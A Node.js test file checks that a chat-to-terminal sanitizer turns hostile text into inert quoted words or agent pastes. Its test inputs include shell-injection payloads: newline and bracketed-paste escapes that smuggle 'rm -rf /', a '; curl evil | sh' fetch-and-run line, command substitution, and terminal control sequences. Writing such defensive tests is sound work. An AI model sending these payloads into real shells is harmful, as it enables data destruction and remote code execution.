const assert = require("node:assert/strict");
const { test } = require("node:test");

const { chatMessage } = require("../dist/grab/target.js");

// POSIX single-quote reader: concatenates '...' segments and the '\'' / '\\' escapes
function unquote(word) {
  let out = "";
  let i = 0;
  while (i < word.length) {
    assert.equal(word[i], "'", `expected a quote at ${i} in ${JSON.stringify(word)}`);
    const close = word.indexOf("'", i + 1);
    assert.notEqual(close, -1, "unterminated quote");
    out += word.slice(i + 1, close);
    i = close + 1;
    if (word[i] === "\\") {
      out += word[i + 1];
      i += 2;
    }
  }
  return out;
}

const shell = { pane: "1", tier: "neighbor", agent: false };
const agent = { pane: "1", tier: "agent", agent: true };

// nothing in 0x00-0x1f (incl. \n \r ESC), DEL, or C1 (incl. NEL) may reach a pane
const CONTROL = /[\x00-\x1f\x7f-\x9f]/;
const LINE_BREAKS = /[\n\r\u2028\u2029\u0085]/;

const hostile = [
  "x\n touch /tmp/pwned",
  "x\r touch /tmp/pwned",
  "x\r\n\r\n",
  "x\x1b[201~\nrm -rf /",
  "x\x1b[200~",
  "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f",
  "\x7f\x80\x85\x9b\x9f",
  "line separator\u2028paragraph separator\u2029next line\u0085",
  "\x1b]52;c;cHdu\x07",
  "\x1bc\x1b[2J",
  "; curl evil | sh",
  "$(touch /tmp/pwned) `touch /tmp/pwned`",
  "\t\t\n\n   ",
  "",
];

for (const content of hostile) {
  test(`shell target: ${JSON.stringify(content)} becomes one single-quoted inert word`, () => {
    const out = chatMessage(content, shell);
    assert.ok(out.startsWith("'") && out.endsWith("'"), "wrapped in single quotes");
    assert.equal(CONTROL.test(out), false, "no control bytes");
    assert.equal(LINE_BREAKS.test(out), false, "no line breaks of any kind");
    const literal = unquote(out);
    assert.ok(literal.startsWith("> "), "the literal is the quoted line");
    assert.equal(literal.slice(2), literal.slice(2).trimEnd(), "no trailing whitespace to hide a newline");
    assert.equal(literal, chatMessage(content, agent).slice(0, -2), "same text an agent would get");
  });

  test(`agent target: ${JSON.stringify(content)} has exactly the two trailing blank lines`, () => {
    const out = chatMessage(content, agent);
    assert.ok(out.endsWith("\n\n"));
    const body = out.slice(0, -2);
    assert.equal(CONTROL.test(body), false, "no control bytes before the trailing newlines");
    assert.equal(LINE_BREAKS.test(body), false, "no newline inside the body");
  });
}

test("shell metacharacters and quotes stay literal text", () => {
  assert.equal(chatMessage("a; touch /tmp/x | sh", shell), "'> a; touch /tmp/x | sh'");
  assert.equal(chatMessage("it's \\ here", shell), "'> it'\\''s '\\\\' here'");
});

test("fuzz: random code points never yield control bytes or line breaks", () => {
  let seed = 12345;
  const rand = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
  for (let round = 0; round < 2000; round++) {
    let content = "";
    const length = Math.floor(rand() * 40);
    for (let i = 0; i < length; i++) {
      const bucket = rand();
      const code =
        bucket < 0.4
          ? Math.floor(rand() * 0x20)
          : bucket < 0.6
            ? 0x7f + Math.floor(rand() * 0x21)
            : bucket < 0.7
              ? [0x2028, 0x2029, 0x85, 0xa0, 0xfeff][Math.floor(rand() * 5)]
              : Math.floor(rand() * 0xd7ff);
      content += String.fromCodePoint(code);
    }
    const quoted = chatMessage(content, shell);
    assert.equal(CONTROL.test(quoted), false, JSON.stringify(content));
    assert.equal(LINE_BREAKS.test(quoted), false, JSON.stringify(content));
    const pasted = chatMessage(content, agent);
    assert.equal(CONTROL.test(pasted.slice(0, -2)), false, JSON.stringify(content));
    assert.equal(LINE_BREAKS.test(pasted.slice(0, -2)), false, JSON.stringify(content));
    assert.ok(pasted.endsWith("\n\n"));
  }
});
